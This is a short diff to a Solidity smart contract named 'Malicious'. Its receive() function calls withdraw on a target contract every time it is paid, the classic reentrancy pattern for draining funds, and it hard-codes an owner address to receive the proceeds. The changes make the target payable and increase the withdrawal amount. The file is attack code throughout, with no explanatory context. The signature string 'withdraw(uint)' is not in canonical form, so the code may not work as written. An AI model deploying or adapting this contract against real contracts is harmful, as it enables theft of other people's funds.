@@ -2,11 +2,11 @@ pragma solidity 0.8.0;
 
 contract Malicious {
 
-  address public target;
+  address payable public target;
   address payable public owner;
 
   constructor(address _destination) payable {
-    target = _destination;
+    target = payable(_destination);
     owner = payable(0x61CC1f8d714451778e7A9bcf3dCeA6Dc4d10CB6e);
   }
 
@@ -27,7 +27,7 @@ contract Malicious {
   }
 
   receive() external payable {
-    (bool success, ) = target.call(abi.encodeWithSignature("withdraw(uint)", 500000000000));
+    (bool success, ) = target.call(abi.encodeWithSignature("withdraw(uint)", 500000000000000000));
     require(success, "Not successful!");
   }
 }
